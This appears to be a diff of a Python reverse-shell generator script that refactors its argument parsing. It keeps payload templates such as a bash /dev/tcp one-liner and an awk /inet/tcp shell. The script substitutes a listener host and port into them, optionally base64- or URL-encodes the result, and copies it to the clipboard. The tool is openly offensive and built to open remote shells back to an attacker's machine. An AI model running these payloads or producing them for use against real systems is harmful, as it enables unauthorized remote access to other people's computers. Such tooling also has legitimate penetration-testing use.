@@ -1,82 +1,11 @@
 #!/usr/bin/env python3
 
-import argparse
 from base64 import b64encode
 from urllib.parse import quote
 from psutil import net_if_addrs
 from sys import argv
 from pyperclip import copy
-from re import match
 
-available_shells = '| BASH | SH | NC | NCAT | RUSTCAT | PERL | PHP | WINDOWS | POWERSHELL | PYTHON | RUBY | SOCAT | NODEJS | TELNET | ZSH | LUA | GOLANG | AWK |'
-subgroup = None
-
-def usage():
-    global available_shells
-    print(f"\n{'':=<15}{''' Args with * are optional '''}{'':=>15}\n")
-    print(f"python3 {argv[0]} -s <shell-type> -lh <lhost> -lp* <lport> -enc*  <encode-type> -list* <shell-type> -listall*")
-    print(f"\n{'':=<15}{'''     Available shells     '''}{'':=>15}\n\n{available_shells}\n")
-    print(f"{'':=<15}{'''     Available encodes    '''}{'':=>15}\n\n| URL | BASE64 |\n")
-    print(f"{'':=<15}{'''          Options         '''}{'':=>15}")
-    print("\n-lh / --lhost <lhost> - Listening host, Ip | localhost | interface\n-lp / --lport <lport> - Listening port, 4444 by default\n-s / --shell <shell-type> - Shell type\n-enc / --encode <enc-type> - Encode type\n-list / --list <shell-name> - List available options of given shell name\n-listall / --listall - List every shell type and option and exit\n-h / --help - Display this menu and exit")
-
-parser = argparse.ArgumentParser(usage=argparse.SUPPRESS,add_help=False)
-parser.add_argument('-lh','--lhost',metavar='')
-parser.add_argument('-lp','--lport',metavar='')
-parser.add_argument('-s','--shell',metavar='')
-parser.add_argument('-enc','--encode',metavar='')
-parser.add_argument('-h','--help',action='store_true')
-parser.add_argument('-list','--list',metavar='')
-parser.add_argument('-listall','--listall',action='store_true')
-args = parser.parse_args()
-
-if args.help or len(argv) == 1:
-    usage()
-    exit(0)
-
-def results(revshell):
-    print("[Shell name] -",subgroup)
-    print("Your shell =>",revshell)
-    copy(revshell)
-    print("[!]Copied to clipboard")
-
-def encodingTable(command):
-    if encode == 'b64' or encode == 'base64':
-        return b64encode(command.encode()).decode()
-    elif encode == 'url':
-        return quote(command,safe='')
-    else:
-        print("[!] Wrong type of encode. Available encodes => | base64 | url |")
-        exit(0)
-
-def craftingTable(shell):
-    global subgroup
-    if subgroup:
-        user_shell = shells[shell][subgroup].replace('LHOST',lhost).replace('LPORT',lport).strip()
-        if encode:
-            encoded_user_shell = encodingTable(user_shell)
-            results(encoded_user_shell)
-            return
-        results(user_shell)
-        return
-    opt = 0 
-    for i in shells[shell]:
-        print(opt,"=>",shells[shell][i].replace("LHOST",lhost).replace("LPORT",lport).strip())
-        opt+=1
-    opt = int(input("Choice: "))
-    idk = 0
-    for i in shells[shell]:
-        if idk == opt:
-            if encode:
-                user_shell = encodingTable(shells[shell][i].replace("LHOST",lhost).replace("LPORT",lport).strip())
-                subgroup=i
-            else:
-                user_shell = shells[shell][i].replace("LHOST",lhost).replace("LPORT",lport).strip()
-                subgroup=i
-            results(user_shell)
-            return
-        idk+=1
-# Store every reverse shell syntax
 shells = {
     'bash':{
         'basic':''' bash -i >& /dev/tcp/LHOST/LPORT 0>&1 ''',
@@ -163,82 +92,155 @@ shells = {
     'awk':{
         '1':''' awk 'BEGIN {s = "/inet/tcp/0/LHOST/LPORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null '''
     }
-}   
-# List given shell type if --list flag supplied
-if args.list:
-    if args.list.lower() == 'netcat':
-        args.list = 'nc' 
-    if args.list.upper() not in available_shells:
-        print(f"[-] {args.list} is not an available shell")
-        exit(0)
-    print(f"- {args.list.upper()} options -\n")
-    for i in shells[args.list]:
-        print(f'==> {i}')
-        print(shells[args.list][i]+"\n")
-    exit(0)
+}
+##
+available_shells = " ".join([x.upper() for x in shells.keys()])
+result = ""
 
-# List all available shells if --listalll flag supplied
-if args.listall:
-    for i in shells:
-        print(f"==> {i}\n")
-        for x in shells[i]:
-            print(f"{x} ~ {shells[i][x]}")
-        print("\n")    
-    exit(0)
+# ENCODING FUNCTIONS
+urlenc = lambda url : quote(url,safe='')
+b64enc = lambda str : b64encode(str.encode()).decode()
 
-# Shell must be given
-if not args.shell:
-    print("[!] Shell type must be given")
-    exit(0)
 
-# Make shell lowercase to avoid case problems
-shell = args.shell.lower()
+def usage():
+    print(f"\n{'':=<10}{''' USAGE '''}{'':=>10}\n")
+    print(f"{argv[0]} <shell-type> <options>\n")
+    print(f"{argv[0]} <informative-option>")
+    print(f"\n{'':=<10}{''' OPTIONS '''}{'':=>10}\n")
+    print(" "*3+f"{'':-<5}{''' informative '''}{'':->5}\n")
+    print("-h / --help - Displays this message and exit")
+    print("-list / --list <shell-type> - Lists different commands available for given shell type")
+    print("-listall / --listall - Lists every shell type and command available")
+    print("\n"+" "*6+f"{'':-<5}{''' shell '''}{'':->5}\n")
+    print("-lp / --lport <lport> - Listening port, default 4444")
+    print("-lh / --lhost <lhost> - Listening host, IpAddr(X.X.X.X) or Iface(E.g eth0), default localhost")
+    print("\n"+" "*5+f"{'':-<5}{''' encoding '''}{'':->5}\n")
+    print("b64  - B64 encodes resulting command")
+    print("url  - Url encodes resulting command")
 
-# Makes netcat nc so user don't have to remember if it was nc or netcat
-if "netcat" in shell:
-    shell = shell.replace("netcat","nc")
-
-# Split shell type and name
-if "=" in shell:
-    subgroup = shell.split("=")[1]
-    shell = shell.split("=")[0]
+def printShellInfo():
+    print(f"\n[+] Shell created [+]\n")
+    copy(result)
+    print(f"+ Type: {shellt}\n+ Name: {shelln}\n+ Command: {result}\n\n- Copied to clipboard")
+    
+def checkShellType(shell):
     try:
-        shells[shell][subgroup]
+        shells[shell]
+        return 1
     except:
-        print(f"[-] Name {subgroup} not found in {shell} shells")
+        print(f"[!] - Shell type {shell} doesn't exist")
+        return 0
+
+def checkShellName(type,name):
+    try:
+        shells[type][name]
+        return 1
+    except:
+        print(f"[!] - Shell name {name} doesn't exist in {type} rshells")
+        return 0
+        
+def craftShell(sh,lh,lp,b64,url):
+    global result
+    result = sh.replace("LHOST",lh).replace("LPORT",lp).strip()
+    if b64:
+        result = b64enc(result)
+    if url:
+        result = urlenc(result)
+    printShellInfo()
+    
+def guidedCraft(sht,lh,lp,b64,url):
+    global result,shelln
+    n = 1
+    lh = lh
+    for opt in shells[sht]:
+        print(n, "=>", shells[sht][opt])
+        n+=1
+    choice = int(input("Choice: "))
+    n = 0
+    for i in shells[sht]:
+        if n == choice-1:
+            shelln = i
+            result = shells[sht][i].replace("LHOST",lh).replace("LPORT",lp).strip()
+            if b64:
+                result = b64enc(result)
+            if url:
+                result = urlenc(result)
+        n+=1
+    printShellInfo()    
+        
+#
+if len(argv) == 1:
+    usage()
+    exit(0)
+    
+# Check if user is listing or asking for help
+shell = argv[1].lower()
+
+if shell == "-h" or shell == "--help":
+    usage()
+    exit(0)
+elif shell == "--listall" or shell == "-listall":
+    for x in shells:
+        print(f"=========== {x.upper()} ==========\n")
+        for i in shells[x]:
+            print(f"{i} - {shells[x][i]}\n")
+    exit(0)
+elif shell == "--list" or shell == "-list":
+    shell = 'nc' if shell == 'netcat' else shell    
+    try:
+        listsh = argv[2].lower()
+    except IndexError:
+        print("[!] - Type of shell has to be given => ./reverse --list bash")
+        print(f"\n[+] - Available shell types:\n{available_shells}")
         exit(0)
-
-# Shell must be available
-if shell.upper() not in available_shells:
-    print(f"[!] {args.shell} not in available shells")
+        
+    if checkShellType(listsh):
+        print(f"[!] - Printing {listsh} options\n")
+        for i in shells[listsh]:
+            print(f"[*] {i} - {shells[listsh][i]}\n")
     exit(0)
+        
+# Let's craft a reverse shell :)
+shellt = shell
+shelln = ""
 
-# Lhost must be given
-if not args.lhost:
-    print("[!] Lhost must be specified")
+if "=" in shell:
+    shellt = shell.split("=")[0]
+    shelln = shell.split("=")[1].lower()
+
+if not checkShellType(shellt):
     exit(0)
-
-# Get ip from the interface or use user input
-try:
-    lhost = net_if_addrs()[args.lhost][0].address
-except:
-    if match("^[a-z]+",args.lhost) and args.lhost != "localhost":
-        print(f"[!]Interface {args.lhost} doesn't exist")
-        exit(0)
-    lhost = args.lhost
-
-# Make lport user choice or 4444 by default
-lport = args.lport if args.lport else '4444'
-
-# Make sure lport is a number
-try:
-    int(lport)
-except:
-    print(f"{lport} is not a valid port number")
+    
+if shelln and not checkShellName(shellt,shelln):
     exit(0)
+    
+# At this point, we got a valid shell type and name. Parse info and create the shell
+lport = "4444"
+lhost = "localhost"
+b64 = 0
+url = 0
 
-# Make encode user choice or None by default
-encode = args.encode if args.encode else None
+for i in range(len(argv)):
+    arg = argv[i]
+    if arg == "-lp" or arg == "--lport":
+        lport = argv[i+1]
+    elif arg == "-lh" or arg == "--lhost":
+        try:
+            lhost = net_if_addrs()["eth0"][0].address
+        except:
+            lhost = argv[i+1]
+    elif arg == "b64":
+        if url:
+            print("[!] - Cannot mix b64-url encode")
+            exit(0)
+        b64 = 1
+    elif arg == "url":
+        if b64:
+            print("[!] - Cannot mix b64-url encode")
+            exit(0)
+        url = 1
 
-# Craft the rshell
-craftingTable(shell)
+if shelln:
+    craftShell(shells[shellt][shelln],lhost,lport,b64,url)
+else:
+    guidedCraft(shellt,lhost,lport,b64,url)
